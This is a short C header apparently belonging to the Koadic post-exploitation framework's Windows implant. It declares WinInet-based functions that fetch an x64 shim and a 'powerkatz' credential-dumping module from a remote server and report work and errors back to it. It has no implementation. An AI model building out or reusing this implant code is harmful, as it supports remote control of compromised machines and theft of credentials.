#pragma once

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Winsock2.h>
#include <Windows.h>
#include <WinInet.h>

#pragma comment(lib, "Wininet.lib")

#include "koadic_types.h"

BOOL koadic_http_request(LPCSTR host, WORD port, BOOL secure, LPCSTR verb, LPCSTR path, LPCSTR szHeaders, SIZE_T nHeaderSize,
	LPCSTR postData, SIZE_T nPostDataSize, char **data, LPDWORD dwDataSize);

BOOL koadic_http_get_x64_shim(koadic_shim_parsed *parsed, char **data, LPDWORD dwSize);
BOOL koadic_http_get_powerkatz(koadic_shim_parsed *parsed, char **data, LPDWORD dwSize);

BOOL koadic_http_report_work(koadic_shim_parsed *parsed, char *work);
BOOL koadic_http_report_error(koadic_shim_parsed *parsed, char *work);